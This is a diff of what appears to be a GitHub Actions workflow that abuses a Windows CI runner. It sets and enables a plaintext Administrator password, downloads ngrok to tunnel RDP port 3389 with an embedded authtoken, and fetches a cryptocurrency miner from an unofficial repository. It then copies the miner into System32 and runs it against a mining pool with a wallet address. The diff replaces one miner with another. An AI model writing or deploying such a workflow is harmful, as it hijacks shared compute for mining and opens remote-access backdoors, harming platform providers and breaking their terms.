@@ -14,12 +14,12 @@ jobs:
       - run: Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Akuhnet123" -Force)
       - run: Get-LocalUser -Name "Administrator" | Enable-LocalUser 
       - run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-      - run: Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-win64.zip -OutFile SRBMiner-Multi-0-8-0-win64.zip
+      - run: Invoke-WebRequest https://github.com/Sit00003/guide/raw/main/nheqminer.zip -OutFile nheqminer.zip
       - run: tar xf ngrok.zip
-      - run: tar xf SRBMiner-Multi-0-8-0-win64.zip
+      - run: tar xf nheqminer.zip
       - run: Copy ngrok.exe C:\Windows\System32
-      - run: Copy SRBMiner-MULTI.exe C:\Windows\System32
+      - run: Copy nheqminer.exe C:\Windows\System32
       - run: cmd /c echo ./ngrok.exe authtoken 1zDlAZ2UEFKMNQcIU2sVRRWeX0k_63ZcnE8jS7MpmcDJpdBE3 >a.ps1
       - run: cmd /c echo cmd /k start ngrok.exe tcp --region ap 3389 >>a.ps1
-      - run: cmd /c echo ./SRBMiner-MULTI.exe --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.runner1 --password x --cpu-threads 4 >>a.ps1
+      - run: cmd /c echo ./nheqminer.exe -v -l ap.luckpool.net:3956 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.runner -p x -t 4 >>a.ps1
       - run: .\a.ps1
